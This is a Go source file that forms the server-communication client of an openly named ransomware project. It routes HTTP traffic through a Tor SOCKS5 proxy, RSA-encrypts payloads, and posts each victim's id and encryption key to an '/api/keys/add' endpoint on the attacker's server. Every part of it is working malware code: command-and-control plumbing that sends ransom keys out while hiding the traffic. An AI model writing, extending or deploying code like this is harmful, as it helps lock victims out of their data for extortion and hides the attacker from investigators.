package client

import (
	"fmt"
	"io"
	"net/http"
	"net/url"
	"strings"

	"github.com/mauri870/ransomware/rsa"
	"golang.org/x/net/proxy"
)

const (
	TOR_PROXY_URL = "127.0.0.1:9050"
)

// Client wraps a http client
type Client struct {
	ServerBaseURL string
	PublicKey     []byte
	HTTPClient    *http.Client
}

// New returns a new client instance
func New(serverBaseURL string, pubKey []byte) *Client {
	return &Client{
		ServerBaseURL: serverBaseURL,
		PublicKey:     pubKey,
		HTTPClient: &http.Client{
			Transport: &http.Transport{},
		},
	}
}

// UseTorTransport upgrades the http transport to use the tor proxy
func (c *Client) UseTorTransport() error {
	dialer, err := proxy.SOCKS5("tcp", TOR_PROXY_URL, nil, proxy.Direct)
	if err != nil {
		return err
	}

	c.HTTPClient.Transport = &http.Transport{
		Dial: dialer.Dial,
	}

	return nil
}

// Do make an http request
func (c *Client) Do(method string, endpoint string, body io.Reader, headers map[string]string) (*http.Response, error) {
	req, err := http.NewRequest(method, c.ServerBaseURL+endpoint, body)
	if err != nil {
		return &http.Response{}, err
	}

	for k, header := range headers {
		req.Header.Set(k, header)
	}

	res, err := c.HTTPClient.Do(req)
	if err != nil {
		return &http.Response{}, err
	}

	return res, nil
}

// SendEncryptedPayload send an encrypted payload to server
func (c *Client) SendEncryptedPayload(endpoint, payload string, customHeaders map[string]string) (*http.Response, error) {
	headers := map[string]string{
		"Content-Type": "application/x-www-form-urlencoded",
	}

	for k, v := range customHeaders {
		headers[k] = v
	}

	ciphertext, err := rsa.Encrypt(c.PublicKey, []byte(payload))
	if err != nil {
		return &http.Response{}, err
	}

	data := url.Values{}
	data.Add("payload", string(ciphertext))
	return c.Do("POST", endpoint, strings.NewReader(data.Encode()), headers)
}

// AddNewKeyPair persist a new keypair on server
func (c *Client) AddNewKeyPair(id, encKey string) (*http.Response, error) {
	payload := fmt.Sprintf(`{"id": "%s", "enckey": "%s"}`, id, encKey)
	return c.SendEncryptedPayload("/api/keys/add", payload, map[string]string{})
}
